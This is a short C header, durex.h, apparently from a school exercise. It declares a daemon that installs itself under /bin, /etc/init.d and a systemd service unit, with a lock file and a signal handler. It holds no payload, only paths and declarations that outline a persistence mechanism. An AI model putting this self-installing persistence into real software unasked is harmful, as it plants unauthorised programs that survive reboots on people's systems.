/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
/*   Updated: 2018/07/13 14:30:54 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

# define DUREX_CREATE_FILE		"/bin/Durex"
# define DUREX_INSTALL_FILE1	"/etc/init.d/Durex"
# define DUREX_INSTALL_FILE2	"/etc/systemd/system/Durex.service"
# define DUREX_LOCK_FILE		"/var/lock/durex.lock"

/* flock */
# include <sys/file.h>
/* close fork setsid dup2 chdir sleep write */
# include <unistd.h>

typedef struct	s_bin
{
	void		*data;
	int			size;
}				t_bin;

typedef struct	s_env
{
	int			lock;
	int			child;
}				t_env;

t_env			e;

int				durex();
void			quitClearlyDaemon();
void			daemonSigHandler(int sig);

#endif /* DUREX_H */
